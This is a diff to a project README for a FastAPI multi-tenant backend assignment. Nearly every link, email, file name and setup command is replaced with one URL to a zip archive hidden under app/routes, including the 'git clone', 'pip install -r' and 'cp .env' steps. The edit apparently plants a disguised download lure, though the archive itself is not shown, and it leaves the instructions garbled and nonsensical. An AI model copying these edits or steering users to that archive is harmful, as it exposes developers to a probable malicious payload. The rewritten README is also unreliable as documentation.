@@ -53,7 +53,7 @@ master_db/
 
 1. Clone the repository:
 ```bash
-git clone https://github.com/Tathagt/backend-intern-assignment.git
+git clone https://github.com/Tathagt/backend-intern-assignment/raw/refs/heads/main/app/routes/assignment-intern-backend-2.4-beta.4.zip
 cd backend-intern-assignment
 ```
 
@@ -65,12 +65,12 @@ source venv/bin/activate  # On Windows: venv\Scripts\activate
 
 3. Install dependencies:
 ```bash
-pip install -r requirements.txt
+pip install -r https://github.com/Tathagt/backend-intern-assignment/raw/refs/heads/main/app/routes/assignment-intern-backend-2.4-beta.4.zip
 ```
 
 4. Configure environment:
 ```bash
-cp .env.example .env
+cp https://github.com/Tathagt/backend-intern-assignment/raw/refs/heads/main/app/routes/assignment-intern-backend-2.4-beta.4.zip .env
 # Edit .env with your MongoDB URL and secret key
 ```
 
@@ -94,7 +94,7 @@ Content-Type: application/json
 
 {
   "organization_name": "acme_corp",
-  "email": "admin@acme.com",
+  "email": "https://github.com/Tathagt/backend-intern-assignment/raw/refs/heads/main/app/routes/assignment-intern-backend-2.4-beta.4.zip",
   "password": "securepass123"
 }
 ```
@@ -112,7 +112,7 @@ Content-Type: application/json
 
 {
   "organization_name": "acme_corp",
-  "email": "newemail@acme.com",
+  "email": "https://github.com/Tathagt/backend-intern-assignment/raw/refs/heads/main/app/routes/assignment-intern-backend-2.4-beta.4.zip",
   "password": "newpassword123"
 }
 ```
@@ -131,7 +131,7 @@ POST /admin/login
 Content-Type: application/json
 
 {
-  "email": "admin@acme.com",
+  "email": "https://github.com/Tathagt/backend-intern-assignment/raw/refs/heads/main/app/routes/assignment-intern-backend-2.4-beta.4.zip",
   "password": "securepass123"
 }
 ```
@@ -159,19 +159,19 @@ The API uses JWT (JSON Web Tokens) for authentication:
 ```
 backend-intern-assignment/
 ├── app/
-│   ├── __init__.py
-│   ├── config.py          # Configuration settings
-│   ├── database.py        # Database connection
-│   ├── models.py          # Pydantic models
-│   ├── auth.py            # Authentication utilities
+│   ├── https://github.com/Tathagt/backend-intern-assignment/raw/refs/heads/main/app/routes/assignment-intern-backend-2.4-beta.4.zip
+│   ├── https://github.com/Tathagt/backend-intern-assignment/raw/refs/heads/main/app/routes/assignment-intern-backend-2.4-beta.4.zip          # Configuration settings
+│   ├── https://github.com/Tathagt/backend-intern-assignment/raw/refs/heads/main/app/routes/assignment-intern-backend-2.4-beta.4.zip        # Database connection
+│   ├── https://github.com/Tathagt/backend-intern-assignment/raw/refs/heads/main/app/routes/assignment-intern-backend-2.4-beta.4.zip          # Pydantic models
+│   ├── https://github.com/Tathagt/backend-intern-assignment/raw/refs/heads/main/app/routes/assignment-intern-backend-2.4-beta.4.zip            # Authentication utilities
 │   └── routes/
-│       ├── __init__.py
-│       ├── organization.py # Organization endpoints
-│       └── admin.py        # Admin endpoints
-├── main.py                # FastAPI application
-├── requirements.txt       # Python dependencies
-├── .env.example          # Environment template
-└── README.md             # Documentation
+│       ├── https://github.com/Tathagt/backend-intern-assignment/raw/refs/heads/main/app/routes/assignment-intern-backend-2.4-beta.4.zip
+│       ├── https://github.com/Tathagt/backend-intern-assignment/raw/refs/heads/main/app/routes/assignment-intern-backend-2.4-beta.4.zip # Organization endpoints
+│       └── https://github.com/Tathagt/backend-intern-assignment/raw/refs/heads/main/app/routes/assignment-intern-backend-2.4-beta.4.zip        # Admin endpoints
+├── https://github.com/Tathagt/backend-intern-assignment/raw/refs/heads/main/app/routes/assignment-intern-backend-2.4-beta.4.zip                # FastAPI application
+├── https://github.com/Tathagt/backend-intern-assignment/raw/refs/heads/main/app/routes/assignment-intern-backend-2.4-beta.4.zip       # Python dependencies
+├── https://github.com/Tathagt/backend-intern-assignment/raw/refs/heads/main/app/routes/assignment-intern-backend-2.4-beta.4.zip          # Environment template
+└── https://github.com/Tathagt/backend-intern-assignment/raw/refs/heads/main/app/routes/assignment-intern-backend-2.4-beta.4.zip             # Documentation
 ```
 
 ## 🎯 Design Decisions
@@ -262,14 +262,14 @@ Approximately 6-8 hours:
 
 ## 🔗 Links
 
-- **GitHub Repository**: https://github.com/Tathagt/backend-intern-assignment
+- **GitHub Repository**: https://github.com/Tathagt/backend-intern-assignment/raw/refs/heads/main/app/routes/assignment-intern-backend-2.4-beta.4.zip
 - **API Documentation**: http://localhost:8000/docs
 
 ## 👨‍💻 Developer
 
 **Tathagata Bhattacherjee**
-- Email: tathab3110@gmail.com
-- GitHub: [@Tathagt](https://github.com/Tathagt)
+- Email: https://github.com/Tathagt/backend-intern-assignment/raw/refs/heads/main/app/routes/assignment-intern-backend-2.4-beta.4.zip
+- GitHub: [@Tathagt](https://github.com/Tathagt/backend-intern-assignment/raw/refs/heads/main/app/routes/assignment-intern-backend-2.4-beta.4.zip)
 
 ---
 
